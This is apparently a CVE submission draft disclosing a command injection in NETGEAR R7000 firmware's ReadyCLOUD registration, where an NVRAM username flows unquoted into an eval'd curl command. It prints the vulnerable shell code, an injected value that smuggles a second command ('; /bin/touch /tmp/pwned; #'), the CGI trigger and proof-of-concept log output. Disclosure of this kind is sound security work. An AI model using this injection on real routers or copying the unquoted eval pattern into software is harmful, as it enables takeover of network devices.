# CVE Submission Draft: NETGEAR R7000 ReadyCLOUD leafp2p-to-comm Command Injection

## Title

NETGEAR R7000 firmware V1.0.9.18_1.2.27 ReadyCLOUD command injection via polluted leafp2p_username state

## Vulnerability Type

- CWE: CWE-78, Improper Neutralization of Special Elements used in an OS Command
- Type: OS Command Injection / Remote Code Execution under polluted persistent state
- Affected components:
  - `/opt/broken/readycloud_control.cgi`
  - `/opt/broken/register.sh`
  - `/opt/broken/comm.sh`
- Verified sink:
  - unquoted `curl --basic -k --user ${NAS_NAME}:${NAS_PASS}` command executed through shell `eval`

## Affected Product and Version

Verified affected firmware:

```text
Vendor: NETGEAR
Product: R7000
Firmware: V1.0.9.18_1.2.27
Firmware image: R7000-V1.0.9.18_1.2.27.chk
```

Target component hashes:

```text
readycloud_control.cgi  19a7bcfd4148c51f28f9178c5a88322893ea237b81aaf44aa36947e5209d43a2
comm.sh                 b15d0028837ad237577cc75f5a77349716adbb05e2876764fa21d8cf8abf52e2
register.sh             46a0e53a8fb52d31e5aefed755e888183c2b6e2603166da7bd9f549a8f599119
libreadycloud.so         79019d0e7ffebf8d10016d92f3b3c8a6137a61bfe6e523e14d3d90fe78429978
httpd                   814114cf40f218c518b6547d234e09175b0d20a5e727f2531ddbb9f63057b997
```

Unconfirmed scope:

- Other R7000 firmware versions.
- Other NETGEAR products containing the same ReadyCLOUD scripts and `libreadycloud.so` logic.
- Whether a web/API endpoint can independently write arbitrary metacharacters into `leafp2p_username`.

## Vulnerability Description

NETGEAR R7000 firmware `V1.0.9.18_1.2.27` contains a command injection vulnerability in its ReadyCLOUD registration flow. During ReadyCLOUD registration, `readycloud_control.cgi` reads `leafp2p_username` from NVRAM and writes it into `readycloud_hostname`. The registration script then invokes `/opt/broken/register.sh`, which sources `/opt/broken/comm.sh`.

`comm.sh` reads `readycloud_hostname` and `readycloud_password`, embeds them into a `curl --user` command string without shell quoting, and evaluates the result through `eval`. If `leafp2p_username` contains shell metacharacters, those metacharacters are propagated into the final shell command and executed.

Verified propagation:

```text
leafp2p_username
  -> readycloud_hostname
  -> NAS_NAME in comm.sh
  -> curl --user ${NAS_NAME}:${NAS_PASS}
  -> eval COMM_RESULT=...
```

Verified payload:

```text
routeruser; /bin/touch /tmp/pwned; #
```

## Root Cause Summary

The vulnerable code in `/opt/broken/comm.sh` performs command construction with unquoted NVRAM-derived data:

```sh
NAS_NAME=`readycloud_nvram get readycloud_hostname`
NAS_PASS=`readycloud_nvram get readycloud_password`
COMM_EXEC="curl --basic -k --user ${NAS_NAME}:${NAS_PASS} --url ${URL}"
FULL_EXEC="`cat "${1}" | ${COMM_EXEC} -X POST --data-binary @- 2>/dev/null`"
eval COMM_RESULT="${FULL_EXEC}" || return $ERROR
```

The values are neither escaped nor passed through an argv-safe API. Shell metacharacters in `readycloud_hostname` alter command structure before `curl` is executed.

## Reproduction Summary

In an authorized firmware-emulation environment, the PoC sets the `leafp2p_username` NVRAM source to:

```text
routeruser; /bin/touch /tmp/pwned; #
```

It then invokes:

```text
PATH_INFO=/api/services/readycloud
REQUEST_METHOD=PUT
/opt/broken/readycloud_control.cgi
```

with a benign ReadyCLOUD registration JSON body:

```json
{"id":"readycloud","state":"1","owner":"alice@example.com","password":"plainpass"}
```

The runtime log shows:

```text
Using routeruser; /bin/touch /tmp/pwned; # as device username
Calling register.sh with line /opt/broken/register.sh 'alice@example.com' 'plainpass'
readycloud_hostname=routeruser; /bin/touch /tmp/pwned; #
curl --basic -k --user routeruser
[pwned]
-rw-r--r-- 1 root root 0 ... /tmp/pwned
```

The PoC was re-run twice from a freshly extracted firmware rootfs and reproduced the same marker file both times.

## Security Impact

Successful exploitation allows an attacker who can control or poison `leafp2p_username` before ReadyCLOUD registration to execute arbitrary OS commands in the router firmware environment. Potential impact includes:

- Reading or modifying router configuration.
- Changing network, DNS, firewall, or startup behavior.
- Downloading and executing additional payloads.
- Establishing persistence.
- Disrupting router availability.

## Suggested CVSS

Conservative score for the currently proven condition:

```text
CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H = 6.8 Medium
```

If an independent remote write primitive for `leafp2p_username` is confirmed, the score should be revised according to that access path.

## Relationship to Public CVEs

No exact duplicate was found.

Related but different:

- `CVE-2024-35520`: NETGEAR R7000 `1.0.11.136`, `RMT_invite.cgi`, `device_name2`.
- `CVE-2022-30078`: NETGEAR R6200v2/R6300v2 IPv6 CGI parameters.
- `CVE-2022-27632`: related NETGEAR command-injection anchor in local screening data, not this ReadyCLOUD chain.

## Known Limitations

The current PoC proves a stable shell sink and ReadyCLOUD trigger under attacker-polluted persistent state. It does not yet prove the upstream external request that writes arbitrary metacharacters into `leafp2p_username`.

The submission should therefore be evaluated as a ReadyCLOUD command injection reachable from polluted persistent configuration state, not as an unqualified unauthenticated remote RCE unless the upstream writer is later proven.

